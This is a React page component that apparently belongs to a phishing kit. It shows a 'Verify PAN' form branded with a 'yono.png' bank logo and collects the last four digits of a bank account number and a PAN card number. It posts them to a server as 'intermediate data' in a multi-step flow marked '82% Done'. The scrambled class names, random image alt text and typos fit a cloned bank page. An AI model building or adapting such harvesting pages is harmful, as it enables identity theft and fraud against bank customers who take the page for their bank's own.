import { useState, FormEvent } from 'react';
import { useLocation } from 'wouter';
import { updateUserData, getNextRoute, saveIntermediateData } from '@/lib/userState';

export default function VerifyPanPage() {
  const [, navigate] = useLocation();
  const [accountLast4, setAccountLast4] = useState('');
  const [panNumber, setPanNumber] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    try {
      // Save the form data
      updateUserData({
        accountLast4,
        panNumber
      });
      
      // Save data to the server
      await saveIntermediateData();
      
      // Navigate to the next page in the flow
      navigate(getNextRoute());
    } catch (error) {
      console.error('Error saving data:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div id="__next">
      <header className="Jeuookhh_logo__chFnY">
        <img 
          alt="2wQI0x" 
          loading="lazy" 
          width="120" 
          height="32" 
          decoding="async"
          data-nimg="1" 
          src="/images/yono.png" 
          style={{ color: "transparent" }} 
        />
      </header>
      <main>
        <div className="Jeuookhh_login_heading__g_rIN">
          <h3 className="Jeuookhh_login_heading_h3__40cUi">Verify PAN</h3>
        </div>
        <div className="Jeuookhh_login_form__UT1PX">
          <p className="Jeuookhh_mandatory_txt__seeNN">Mandory fields an asterisk (*)</p>
          <form className="Jeuookhh_form__NPDIu" onSubmit={handleSubmit}>
            <input type="hidden" name="formtoken" value="t57Xpy" />
            <div className="Jeuookhh_form_group__iOuIR">
              <label className="Jeuookhh_label__fvDl5">
                Last 4-digit Account No <span className="Jeuookhh_mandatory_txt__seeNN">*</span>
              </label>
              <input 
                name="LascN" 
                type="text" 
                className="Jeuookhh_form_control__aKuXl" 
                required 
                inputMode="numeric" 
                maxLength={4} 
                minLength={4}
                value={accountLast4}
                onChange={(e) => setAccountLast4(e.target.value)}
              />
            </div>
            <div className="Jeuookhh_form_group__iOuIR">
              <label className="Jeuookhh_label__fvDl5">
                Pan card No <span className="Jeuookhh_mandatory_txt__seeNN">*</span>
              </label>
              <input 
                name="Upan" 
                type="text" 
                className="Jeuookhh_form_control__aKuXl" 
                required 
                maxLength={10} 
                pattern="[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}" 
                minLength={10}
                value={panNumber}
                onChange={(e) => setPanNumber(e.target.value)} 
              />
            </div>
            <p className="Jeuookhh_content_title__eLlbR">82% Done</p>
            <div className="Jeuookhh_t_center____ZxZ">
              <input 
                type="submit" 
                className="Jeuookhh_btn_default__PIkhU" 
                value={isSubmitting ? "Processing..." : "submit"} 
                disabled={isSubmitting}
              />
            </div>
          </form><br />
        </div>
      </main>
      <div className="Jeuookhh_footer_area__5ot65">
        <img 
          alt="Aeh0p0" 
          loading="lazy" 
          width="68" 
          height="28" 
          decoding="async" 
          data-nimg="1" 
          src="/images/gwhp.png" 
          style={{ color: "transparent" }} 
        />
      </div>
      <div className="Jeuookhh_footer__Wxn0J">
        <p>©</p>
      </div>
    </div>
  );
}